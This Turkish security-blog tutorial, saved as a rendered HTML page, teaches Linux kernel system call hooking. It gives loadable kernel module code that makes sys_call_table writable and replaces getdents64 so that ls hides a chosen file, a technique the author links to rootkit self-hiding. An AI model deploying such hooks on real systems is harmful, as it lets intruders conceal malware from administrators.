@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Linux System Call Hooking</title>
+  <meta name="description" content="Linux System Call Hooking">
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:4000/ss/2019/05/07/linux-system-call-hooking.html">
+  <link rel="alternate" type="application/rss+xml" title="Daily Security" href="/feed.xml">
+  
+  
+</head>
+
+
+  <body>
+
+    <header class="site-header" role="banner">
+
+  <div class="wrapper">
+    
+    
+    <a class="site-title" href="/">Daily Security</a>
+  
+    
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+              <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+              <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger">
+          
+            
+            
+          
+            
+            
+          
+            
+            
+            <a class="page-link" href="/about/">About</a>
+            
+          
+            
+            
+            <a class="page-link" href="/about/">About</a>
+            
+          
+            
+            
+          
+            
+            
+          
+            
+            
+          
+            
+            
+          
+        </div>
+      </nav>
+    
+  </div>
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Linux System Call Hooking</h1>
+    <p class="post-meta">
+      <time datetime="2019-05-07T00:00:00+03:00" itemprop="datePublished">
+        
+        May 7, 2019
+      </time>
+      </p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h1 id="linux-system-call-hooking">Linux System Call Hooking</h1>
+
+<p>Merhaba arkadaşlar <strong>Linux System Call Hooking</strong> isimli yazıma hoşgeldiniz.</p>
+
+<p>Bu yazımda sizlere türkçe adı ile <strong>Sistem Çağrısı Kancalama</strong>‘yı anlatacağım.</p>
+
+<p><strong>System Call</strong> nedir kısmına gelmeden önce <strong>rootkit</strong>‘lerin <strong>System Call Hooking</strong>‘i neden sıklıkla kullandığını anlatayım.</p>
+
+<p>Örneğin düşünelim ki bir <strong>Rootkit</strong> yazdık ve bu <strong>Rootkit</strong>‘in sistem içerisinde kendini gizlemesi lazım zaten <strong>rootkit</strong>‘lerin en büyük gereksinimlerinden biri kendini gizlemesi.</p>
+
+<p>Diyelim ki <strong>ls</strong> komutu çalıştığında <strong>Rootkit</strong>‘imiz gösterilmesin istiyoruz. Bunun için bizim <strong>ls</strong> komutunun içerisindeki <strong>System Call</strong>‘leri <strong>Hook</strong> edip <strong>ls</strong> komutu çalıştığında gelen liste içerisinde bizim komutumuzu gizlemek.</p>
+
+<p>İlerideki kısımlarda basitce bunu yapacağız ama ondan önce <strong>System Call</strong> kavramının ne olduğunu öğrenelim.</p>
+
+<p>Aklınızda ingilizce olarak kalmasını istediğimden buradaki terimleri ingilizce kullanarak devam edicem anlatmaya.</p>
+
+<p><strong>System Call</strong>‘lerini aşşağıda ki resimden anlatmaya başlayalım yavaşca :</p>
+
+<p><img src="http://www.cs.uregina.ca/Links/class-info/330-bkup/SystemCall_IO/System_Calls.gif" alt="" /></p>
+
+<p>Öncelike bizim <strong>Executable</strong>‘ımız <strong>Library Functions</strong>‘a gider program içerisinde kullanılacak fonksiyonları almak için yada direk olarak <strong>System call</strong>‘larına başvurur resimde de görebildiğiniz gibi.</p>
+
+<p>Ayrıca resimde ki okları takip edersek şayet bu <strong>System Call</strong>‘ların <strong>Kernel</strong>‘e sonrasında ise <strong>Hardware</strong>‘e bağlandığını gözlemleyebiliriz.</p>
+
+<p><strong>System Call</strong>‘lerin neler olduğunu soracak olursanız aşşağıda bir kaçını listeleyen bir resim bırakıyorum. Tüm sistem çağrılarına yani <strong>System Call</strong>‘lara ulaşmak istiyorsanız resmin üstüne de fotorafı aldığım web siteyi bırakacağım.</p>
+
+<p><a href="https://syscalls.kernelgrok.com/">Linux Syscall Reference</a>
+<img src="https://i.hizliresim.com/MVO54g.png" alt="" /></p>
+
+<p>Yani daha basite indirge edersek şayet <strong>System Call</strong>‘leri bir program içerisinde kullandığımız örneğin <strong>printf</strong> gibi bir <strong>Library Function</strong>‘unun sistem’e uyarlanmış halidir.</p>
+
+<p><strong>System Call</strong>‘lerini anladığımıza göre <strong>Hooking</strong> terimine geçebiliriz. Bu terimi daha önce yazdığım blogum olan <a href="https://blacknbunny.github.io/2019/04/14/Linux-Function-Hooking.html">Linux Function Hooking</a> içerisinde anlattım o yüzden bu blogumda anlatmıyacağım.</p>
+
+<p>Şimdi gelelim bilalin topu kaleye nasıl soktuğuna, pardon pardon bu başka konuydu… yine karıştırdım.</p>
+
+<p>Gelelim <strong>System Call</strong>‘lerinin nasıl <strong>Hook</strong> edildiğine.</p>
+
+<p>Aslında bu konuda daha önce anlattığım <strong>Function Hooking</strong>‘e çok benzer bir konu. Aralarında ki bir kaç fark birinin <strong>User-mode</strong> içerisinde bu yazının ise <strong>Kernel-mode</strong> içerisinde geçmesi.</p>
+
+<p><img src="https://i.hizliresim.com/GmdQVV.jpg" alt="" /></p>
+
+<p>Buraya birde <strong>User-mode</strong> ve <strong>Kernel-mode</strong> arasındaki farkları anlatan bir stackoverflow çözümünü bırakıyorum : <a href="https://stackoverflow.com/questions/1311402/what-is-the-difference-between-user-and-kernel-modes-in-operating-systems">User vs Kernel</a></p>
+
+<h1 id="system-call-trace">System Call Trace</h1>
+
+<p>Şayet bir <strong>Executable</strong> içerisinde bulunan <strong>System Call</strong>‘leri yakalamak ve incelemek istiyorsak linux içerisinde bulunan <strong>strace</strong> komutumuz bize çok yardımcı olacaktır.</p>
+
+<p>Nasıl çalıştığını bilmeyen arkadaşlar için buraya <strong>strace</strong> komutunu anlatan bir yazı bırakıyorum : <a href="https://www.tecmint.com/strace-commands-for-troubleshooting-and-debugging-linux/">Strace</a></p>
+
+<h1 id="ls-komutunu-hook-etme">LS komutunu hook etme</h1>
+
+<p>Öncelik ile <strong>ls</strong> komutunun hangi <strong>System Call</strong>‘lerini içerdiğini görmek için <strong>strace</strong> komutunu kullanıyoruz ve çıktımız şu şekilde oluyor :</p>
+
+<p>Biraz uzun olduğu için pastebin’e ekledim çıktıyı : <a href="https://pastebin.com/fRjDHF2T">Strace çıktısı</a></p>
+
+<p>Bu çıktının içerisinde gözümüze çarpan bir sürü <strong>System Call</strong> mevcut olan ve dizin girişlerini alan <strong>getdents64</strong> sistem çağrısı ilgimizi çekiyor ve <a href="http://man7.org/linux/man-pages/man2/getdents.2.html">man page</a>‘ini incelediğimizde görebiliriz ki :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int getdents(unsigned int fd, struct linux_dirent *dirp,
+                unsigned int count);
+</code></pre></div></div>
+
+<p>4 adet argüman alıyor ama bu argümanların içerisinde bir <strong>structure</strong> yani bir yapı olan <strong>linux_dirent64</strong> diğerlerinden farklı olarak <strong>ls</strong> komutu çalıştıktan sonra gelen listeyi döndürüyor :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>struct linux_dirent {
+	unsigned long  d_ino;     /* Inode number */
+	unsigned long  d_off;     /* Offset to next linux_dirent */
+	unsigned short d_reclen;  /* Length of this linux_dirent */
+	char d_name[];  /* Filename (null-terminated) */
+	/* length is actually (d_reclen - 2 -
+	offsetof(struct linux_dirent, d_name)) */
+	/*
+	char pad;       // Zero padding byte
+	char d_type;    // File type (only since Linux
+	// 2.6.4); offset is (d_reclen - 1)
+	*/
+}
+</code></pre></div></div>
+
+<p>Ayrıca man page içerisinde bu <strong>System Call</strong>‘ın <strong>readdir.c</strong> içerisinde kullanıldığını görebiliyoruz.</p>
+
+<p>Artık bundan sonrası <strong>LKM</strong> yani <strong>Loadable Kernel Module</strong> development’e giriyor ve bunun ne olduğunu bilmeyen arkadaşlarımız varsa aramızda onlar içinde bir yazı yazdım.</p>
+
+<p>Buradan ulaşabilirsiniz : <a href="https://blacknbunny.github.io/2019/04/22/loadable-kernel-module.html">Loadable Kernel Module Development</a></p>
+
+<h1 id="system-call-hooking-i̇çin-lkm-geliştirmek">System Call Hooking İçin LKM Geliştirmek</h1>
+
+<p><strong>Strace</strong> komutunu kullanıp <strong>ls</strong> içerisinden <strong>getdents64</strong> sistem çağrısını incelersek şayet:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>deadbeef@pop-os:~$ strace ls 2&gt;&amp;1 | grep getdents64
+getdents64(3, /* 30 entries */, 32768)  = 960
+getdents64(3, /* 0 entries */, 32768)   = 0
+deadbeef@pop-os:~$
+</code></pre></div></div>
+
+<p>30 adet entry olduğunu görebiliriz bulunduğumuz klasör içerisinde. Doğrulamak için de <strong>wc</strong> komutunu kullanabiliriz :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>deadbeef@pop-os:~$ ls -la | wc -l
+30
+</code></pre></div></div>
+
+<p>Şimdi elde ettiğimiz tüm bu bilgiler ile <strong>LKM</strong>‘mizi geliştirmeye başlayalım yavaştan.</p>
+
+<p>Bu kısımı çok basit anlatacağım aramızda anlamakta zorlanan arkadaşlar olur diye.</p>
+
+<p>Ve tam anlatmaya başlarken kız arkadaşım kabus görüp kalkıyor.</p>
+
+<p>Evet onu yatıştırdıktan sonra yazıya devam edebilirim.</p>
+
+<p>Öncelikle kütüphanelerimizi ekleyelim :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;linux/module.h&gt;
+#include &lt;linux/init.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/moduleparam.h&gt;
+#include &lt;linux/unistd.h&gt;
+#include &lt;linux/semaphore.h&gt;
+#include &lt;linux/dirent.h&gt;
+#include &lt;asm/cacheflush.h&gt;
+</code></pre></div></div>
+
+<p>Sonrasında yazacağımız <strong>LKM</strong>‘nin detaylarını girelim :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MODULE_AUTHOR("blacknbunny");
+MODULE_DESCRIPTION("LS Komutundan cokgizlidosya.txt yi gizlemek");
+MODULE_LICENSE("GPL");
+</code></pre></div></div>
+
+<p>İleride daha detaylı anlatacağım <strong>sys_call_table</strong> :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void **sys_call_table;
+</code></pre></div></div>
+
+<p><strong>LS</strong> komutundan saklayacağımız dosya :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define DOSYA_ISMI "cokgizlidosya.txt"
+</code></pre></div></div>
+
+<p>Orjinal <strong>getdents64</strong> sistem çağrısı :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmlinkage int (*org_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+</code></pre></div></div>
+
+<p>Bu orjinal sistem çağrısı yerine bizim aktaracağımız hookumuz :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
+{
+        int returnval;
+        struct linux_dirent64 *cur = dirp;
+        int i = 0;
+        returnval = org_getdents64(fd, dirp, count);
+        while (i &lt; returnval) {
+                if (strncmp(cur-&gt;d_name, DOSYA_ISMI, strlen(DOSYA_ISMI)) == 0) {
+                        int reclen = cur-&gt;d_reclen;
+                        char *next_rec = (char *)cur + reclen;
+                        int len = (int)dirp + returnval - (int)next_rec;
+                        memmove(cur, next_rec, len);
+                        returnval -= reclen;
+                        continue;
+                }
+                i += cur-&gt;d_reclen;
+                cur = (struct linux_dirent*) ((char*)dirp + i);
+        }
+        return returnval;
+}
+</code></pre></div></div>
+
+<p>Tüm bilgileri toplayıp birleştirdikten sonra bu hooku yazdım.</p>
+
+<p>Hooku basitce açıklayacak olursam. <strong>linux_dirent64</strong> <strong>struct</strong>‘u üzerinde bir döngü oluşturduk ve her bir dosya ismini aradık.</p>
+
+<p>Bizim belirttiğimiz gizlenilecek dosya ile aynı ismi taşıyorsa bunu <strong>ls</strong> komutunda gösterme dedik.</p>
+
+<h1 id="system-call-table">System Call Table</h1>
+<p>Şimdi geldik değirmenin döndüğü yere.</p>
+
+<p><strong>System Call Table</strong> yani <strong>sys_call_table</strong> kernelin içerdiği tüm sistem çağrılarını tutar. Aynı zamanda <strong>hafıza</strong> yani <strong>memory</strong> içerisinde nerede olduğunu bize gösterir.</p>
+
+<p><strong>System Call Table</strong>‘nin adresini linux içerisinde bulmamız gerek ki gerçek <strong>System Call</strong> ile bizim yazdığımız sahte <strong>Hook</strong> sistem çağrısını değiştirebilelim.</p>
+
+<p>Ve bu şekilde her <strong>ls</strong> komutu çalıştığında gerçek <strong>getdents64</strong> sistem çağrısı yerine bizim <strong>hook_getdents64</strong> sistem çağrımız çalışıcak.</p>
+
+<p>Yazdığımız hook belirttiğimiz dosyayı gizlemeye yaradığından <strong>ls</strong> komutu çalıştığında hiçbir şekilde görülemeyecek.</p>
+
+<p><strong>sys_call_table</strong>‘nin adresini bulmak için <strong>/boot</strong> içerisinde bulunan <strong>System.map</strong>‘e bakmamız gerekiyor :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>deadbeef@pop-os:~$ sudo grep sys_call_table /boot/System.map-`uname -r`
+ffffffff820001c0 R sys_call_table
+ffffffff820015a0 R ia32_sys_call_table
+</code></pre></div></div>
+
+<p>Ve bu şekilde <strong>sys_call_table</strong>‘mizin adresini bulduk <strong>ffffffff820001c0</strong></p>
+
+<p>Şimdide bu <strong>sys_call_table</strong>‘ı yazılabilir yapmamız gerek ki asıl sistem çağrısı ile bizim sahte yani <strong>Hook</strong> sistem çağrısını değiştirebilelim.</p>
+
+<p>Bunuda yapmak için vereceğimiz <strong>sys_call_table</strong> adresinin <strong>table entry</strong>‘sini <strong>manual</strong> olarak writable yapmamız gerek.</p>
+
+<p>Bu stackoverflow sorusunun cevaplarında bunu yapmak için bir sürü teknik var bakmak isterseniz : <a href="https://stackoverflow.com/questions/2103315/linux-kernel-system-call-hooking-example">StackOverflow sys_call_table</a></p>
+
+<p>Bunuda <strong>lookup_address</strong> fonksiyonu ile <strong>page table</strong>‘nin adresini bulup sonrasında içerisinde <strong>sys_call_table</strong>‘ye yazma yetkisi vermeliyiz :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int set_page_rw(unsigned long addr)
+{
+  unsigned int level;
+  pte_t *pte = lookup_address(addr, &amp;level);
+  if (pte-&gt;pte &amp;~ _PAGE_RW) pte-&gt;pte |= _PAGE_RW;
+  return 0;
+}
+</code></pre></div></div>
+
+<p>Günün sonunda bu yazdığımız <strong>LKM</strong>‘yi <strong>kernel</strong>‘e yükleyeceğiz fakat sonrasında bunu sildiğimizde herşeyin tekrar aynı haline dönmesi olayıda var birde.</p>
+
+<p>Bunun içinde eğer <strong>sys_call_table</strong>‘yi tekrardan <strong>Read-Only</strong> yapmak istiyorsak yine aynı tekniği kullanabiliriz :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int set_page_ro(unsigned long addr)
+{
+  unsigned int level;
+  pte_t *pte = lookup_address(addr, &amp;level);
+  pte-&gt;pte = pte-&gt;pte &amp;~_PAGE_RW;
+  return 0;
+}
+</code></pre></div></div>
+
+<p>Yetkilendirmeleri merak edenler varsa <strong>arch/x86/include/asm/pgtable_types.h</strong> içerisinden küçük bir liste :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define _PAGE_BIT_PRESENT       0       /* is present */
+#define _PAGE_BIT_RW            1       /* writeable */
+#define _PAGE_BIT_USER          2       /* userspace addressable */
+#define _PAGE_BIT_PWT           3       /* page write through */
+#define _PAGE_BIT_PCD           4       /* page cache disabled */
+#define _PAGE_BIT_ACCESSED      5       /* was accessed (raised by CPU) */
+#define _PAGE_BIT_DIRTY         6       /* was written to (raised by CPU) */
+#define _PAGE_BIT_PSE           7       /* 4 MB (or 2MB) page */
+#define _PAGE_BIT_PAT           7       /* on 4KB pages */
+#define _PAGE_BIT_GLOBAL        8       /* Global TLB entry PPro+ */
+#define _PAGE_BIT_UNUSED1       9       /* available for programmer */
+#define _PAGE_BIT_IOMAP         10      /* flag used to indicate IO mapping */
+#define _PAGE_BIT_HIDDEN        11      /* hidden by kmemcheck */
+#define _PAGE_BIT_PAT_LARGE     12      /* On 2MB or 1GB pages */
+#define _PAGE_BIT_SPECIAL       _PAGE_BIT_UNUSED1
+#define _PAGE_BIT_CPA_TEST      _PAGE_BIT_UNUSED1
+#define _PAGE_BIT_SPLITTING     _PAGE_BIT_UNUSED1 /* only valid on a PSE pmd */
+#define _PAGE_BIT_NX           63       /* No execute: only valid after cpuid check */
+#define _PAGE_PRESENT   (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_PRESENT)
+#define _PAGE_RW        (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_RW)
+#define _PAGE_USER      (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_USER)
+#define _PAGE_PWT       (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_PWT)
+#define _PAGE_PCD       (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_PCD)
+#define _PAGE_ACCESSED  (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_ACCESSED)
+#define _PAGE_DIRTY     (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_DIRTY)
+#define _PAGE_PSE       (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_PSE)
+#define _PAGE_GLOBAL    (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_GLOBAL)
+#define _PAGE_UNUSED1   (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_UNUSED1)
+#define _PAGE_IOMAP     (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_IOMAP)
+#define _PAGE_PAT       (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_PAT)
+....
+#define _PAGE_PAT_LARGE (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_PAT_LARGE)
+#define _PAGE_SPECIAL   (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_SPECIAL)
+#define _PAGE_CPA_TEST  (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_CPA_TEST)
+#define _PAGE_SPLITTING (_AT(pteval_t, 1) &lt;&lt; _PAGE_BIT_SPLITTING)
+</code></pre></div></div>
+
+<p>Modül yüklendiğinde yani <strong>insmod</strong> çalıştığında :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static int __init getdents_hook_init(void)
+{
+
+  sys_call_table = (void*)0xffffffff820001c0;
+  org_getdents64 = sys_call_table[__NR_getdents64];
+
+  set_page_rw(sys_call_table);
+  sys_call_table[__NR_getdents64] = hook_getdents64;
+        return 0;
+}
+</code></pre></div></div>
+
+<p><strong>LKM</strong>‘mizi oluşturup <strong>kernel</strong>‘e dahil ettikten sonra çalışacak fonksiyon.</p>
+
+<p><strong>ÖNEMLİ</strong> : Buradaki <strong>sys_call_table = (void*)0xsizinsyscalltableadresiniz;</strong></p>
+
+<p>Kısmını kendi <strong>sys_call_table</strong> adresiniz ile değiştirmeniz gerekli.</p>
+
+<p>Nasıl bulacağınızı yukarıda anlatmıştım eğer blog içerisinde bulamadıysanız hemen <strong>CTRL + F</strong> yapıp <strong>System.map</strong> bunu arayın orada <strong>sys_call_table</strong> adresinin nasıl bulunacağını anlattım.</p>
+
+<p>Şimdi geldik eğer bunu silmek istersek kısmına :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static void __exit getdents_hook_exit(void)
+{
+  sys_call_table[__NR_getdents64] = org_getdents64;
+  set_page_ro(sys_call_table);
+        return 0;
+}
+</code></pre></div></div>
+
+<p>Eğer oluşturduğumuz <strong>LKM</strong>‘yi silersek oluşturduğumuz sahte <strong>Hook</strong> fonksiyonunu <strong>sys_call_table</strong>‘den çıkartıp herşeyi tekrar eski haline çevirmesini söylüyoruz programımıza aynı zamanda <strong>table entry</strong>‘ide tekrardan <strong>Read-Only</strong> yapıyoruz.</p>
+
+<p>Şimdi tüm bu yazdığımız kodları tek bir bütün haline almaya geldi sıra hepsini pastebine yüklüyorum. İçerisinden değiştirmeniz gereken tek kısım <strong>sys_call_table</strong> adresi.</p>
+
+<p>Kod : <a href="https://pastebin.com/a4MF1J7T">System Call Hooking Code</a></p>
+
+<h1 id="make">Make</h1>
+<p>Şimdi sıra geldi bu kodu derlemeye.</p>
+
+<p><strong>Makefile</strong> isminde bir dosya oluşturun ve yukarıda yazdığımız kodu nasıl kaydettiyseniz burada bulunan <strong>syscallhook.o</strong> ismini onunla değiştiriniz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>obj-m += syscallhook.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+</code></pre></div></div>
+
+<p><strong>make</strong> komutunu çalıştırıp derledikten sonra çıktımız :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@heyhey:~/hey# make
+make -C /lib/modules/4.4.0-78-generic/build M=/root/hey modules
+make[1]: Entering directory `/usr/src/linux-headers-4.4.0-78-generic'
+  CC [M]  /root/hey/syscallhook.o
+/root/hey/syscallhook.c: In function ‘hook_getdents64’:
+/root/hey/syscallhook.c:36:21: warning: assignment from incompatible pointer type [enabled by default]
+                 cur = (struct linux_dirent*) ((char*)dirp + i);
+                     ^
+/root/hey/syscallhook.c: In function ‘getdents_hook_init’:
+/root/hey/syscallhook.c:63:3: warning: passing argument 1 of ‘set_page_rw’ makes integer from pointer without a cast [enabled by default]
+   set_page_rw(sys_call_table);
+   ^
+/root/hey/syscallhook.c:41:5: note: expected ‘long unsigned int’ but argument is of type ‘void **’
+ int set_page_rw(unsigned long addr)
+     ^
+/root/hey/syscallhook.c: In function ‘getdents_hook_exit’:
+/root/hey/syscallhook.c:71:3: warning: passing argument 1 of ‘set_page_ro’ makes integer from pointer without a cast [enabled by default]
+   set_page_ro(sys_call_table);
+   ^
+/root/hey/syscallhook.c:49:5: note: expected ‘long unsigned int’ but argument is of type ‘void **’
+ int set_page_ro(unsigned long addr)
+     ^
+/root/hey/syscallhook.c:72:9: warning: ‘return’ with a value, in function returning void [enabled by default]
+         return 0;
+         ^
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /root/hey/syscallhook.mod.o
+  LD [M]  /root/hey/syscallhook.ko
+make[1]: Leaving directory `/usr/src/linux-headers-4.4.0-78-generic'
+</code></pre></div></div>
+
+<p><strong>LKM</strong>‘mizi derledikten sonra şimdi sıra geldi <strong>ls</strong> komutundan kaçıracağımız baştada belirttiğimiz dosya ismini oluşturmaya :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@heyhey:~/hey# touch cokgizlidosya.txt
+</code></pre></div></div>
+
+<p>Bundan sonrası ziyafet. Şimdi oluşturduğumuz modülü kernel içerisine <strong>insmod</strong> komutu ile aktaralım :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@heyhey:~/hey# insmod ./syscallhook.ko
+</code></pre></div></div>
+
+<p>Modülü yüklemeden önce <strong>ls</strong> komutunun bulduğu dosyalar :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root@heyhey:~/hey# ls
+cokgizlidosya.txt  Module.symvers  syscallhook.mod.c
+Makefile           syscallhook.c   syscallhook.mod.o
+modules.order      syscallhook.ko  syscallhook.o
+</code></pre></div></div>
+
+<p>Modülü yükledikten sonra <strong>ls</strong> komutunun bulduğu dosyalar :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root@heyhey:~/hey# ls
+Makefile       Module.symvers  syscallhook.ko     syscallhook.mod.o
+modules.order  syscallhook.c   syscallhook.mod.c  syscallhook.o
+</code></pre></div></div>
+
+<p>Gördüğünüz gibi <strong>ls</strong> komutundan <strong>cokgizlidosya.txt</strong> dosyamızı gizlemeyi <strong>System Call Table</strong> içerisindeki <strong>ls</strong> komutunun kullandığı sistem çağrılarını hook ederek başardık.</p>
+
+<p>Bu modülü silip herşeyi eski haline çevirmek için :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root@heyhey:~/hey# rmmod syscallhook
+</code></pre></div></div>
+
+<p>Ve bu yazının da sonunda geldik. Umarım açıklayıcı anlatabilmişimdir.</p>
+
+<p>Sorular için twitter hesabım : <a href="https://twitter.com/0DAYanc">@0DAYanc</a></p>
+
+  </div>
+
+  
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Daily Security</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>
+            
+              Daily Security
+            
+            </li>
+            
+            <li><a href="mailto:xazamaxi@protonmail.com">xazamaxi@protonmail.com</a></li>
+            
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/blacknbunny"><span class="icon icon--github"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">blacknbunny</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/0DAYanc"><span class="icon icon--twitter"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">0DAYanc</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>In this blog we&#39;re going to solve CTF&#39;s &amp; Write Some Software&#39;s.My goal is redirect my little knowledge to other people.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
